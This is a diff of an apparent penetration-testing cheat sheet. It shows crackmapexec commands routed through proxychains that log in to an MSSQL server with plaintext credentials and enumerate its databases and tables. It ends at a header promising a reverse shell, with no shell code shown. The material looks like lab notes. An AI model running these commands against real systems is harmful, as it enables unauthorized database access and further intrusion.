@@ -1,11 +1,13 @@
 ### Show all databases
 proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM master.sys.databases;'
+SELECT name FROM sys.databases;
 
 ### Show all tables from msdb database
 proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM msdb.sys.tables'
+SELECT * FROM database_name.information_schema.tables;
 
-### show all values of table spt_monitor from master database
-SELECT * FROM msdb.dbo.monitor;
+### show all values of tablename from database_name
+select * from database_name.dbo.table_name;
 
 ### Mssql Connection and Get Reverse Sehll
 ```
